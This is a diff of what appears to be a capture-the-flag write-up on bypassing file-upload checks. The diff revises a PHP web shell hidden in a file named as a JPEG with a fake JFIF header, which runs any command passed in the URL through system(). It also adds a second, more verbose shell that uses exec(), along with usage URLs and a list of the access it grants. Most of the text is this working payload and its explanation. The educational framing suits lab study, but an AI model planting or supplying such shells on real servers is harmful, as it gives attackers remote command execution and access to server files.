@@ -61,13 +61,9 @@ Create a file named `shell.php.jpg` with the following content:
 JFIF;
 <?php
 if (isset($_GET['cmd'])) {
-    $cmd = $_GET['cmd'];
-    echo "Command received: $cmd<br>";
-    echo "Executing...<br>";
-    system($cmd, $retval);
-    echo "Return value: $retval<br>";
+    system($_GET['cmd']);
 } else {
-    echo "No command provided.";
+    echo "Usage: ?cmd=command";
 }
 ?>
 ```
@@ -170,13 +166,9 @@ The payload (`shell.php.jpg`) is crafted to bypass upload restrictions and enabl
 JFIF;
 <?php
 if (isset($_GET['cmd'])) {
-    $cmd = $_GET['cmd'];
-    echo "Command received: $cmd<br>";
-    echo "Executing...<br>";
-    system($cmd, $retval);
-    echo "Return value: $retval<br>";
+    system($_GET['cmd']);
 } else {
-    echo "No command provided.";
+    echo "Usage: ?cmd=command";
 }
 ?>
 ```
@@ -188,15 +180,13 @@ if (isset($_GET['cmd'])) {
 
 2. **PHP Code Section**
    - `isset($_GET['cmd'])`: Checks if a command was provided in URL
-   - `$cmd = $_GET['cmd']`: Retrieves the command from GET parameter
-   - `system($cmd, $retval)`: Executes the system command
-   - `$retval`: Captures the command's exit status
+   - `system($_GET['cmd'])`: Directly executes and outputs the system command
+   - Simple error message if no command is provided
 
 3. **Output Structure**
-   - Shows received command
-   - Indicates execution status
-   - Displays command output
-   - Shows return value for debugging
+   - Direct command output without additional formatting
+   - Minimal and efficient execution
+   - Clean and straightforward response
 
 ### Usage Example
 ```
@@ -206,8 +196,52 @@ http://localhost:8080/uploads/shell.php.jpg?cmd=whoami
 ### Security Implications
 - Allows remote command execution
 - Bypasses file upload restrictions
-- Provides detailed command execution feedback
+- Direct command output display
 - Can be used to explore server filesystem
 - Enables privilege escalation attempts
 
 Note: This payload is for educational purposes in CTF challenges. Using such code in production environments would create serious security vulnerabilities.
+
+### Alternative Shell Implementation (shell.php.jpg)
+```php
+JFIF;
+<?php
+// Simple shell with command execution
+if(isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    echo "<pre>\n";
+    echo "Command received: $cmd\n";
+    echo "Executing...\n";
+    $output = [];
+    exec($cmd . " 2>&1", $output);
+    echo "Output:\n";
+    echo implode("\n", $output) . "\n";
+    echo "</pre>";
+} else {
+    echo "No command provided. Use ?cmd=command";
+}
+?>
+```
+
+#### Key Features:
+1. **Enhanced Output Formatting**
+   - Uses `<pre>` tags for better output readability
+   - Shows detailed execution steps and command status
+   - Captures and formats both stdout and stderr (`2>&1`)
+
+2. **Command Handling**
+   - Uses `exec()` instead of `system()` for more controlled output
+   - Stores output in array for better manipulation
+   - Provides more verbose feedback about command execution
+
+3. **User Experience**
+   - More detailed error messages
+   - Structured output presentation
+   - Better debugging capabilities
+
+### Usage Example
+```
+http://localhost:8080/uploads/shell77.php?cmd=whoami
+```
+
+This version provides more verbose output and better formatting, which can be helpful for debugging or when more detailed command execution information is needed.
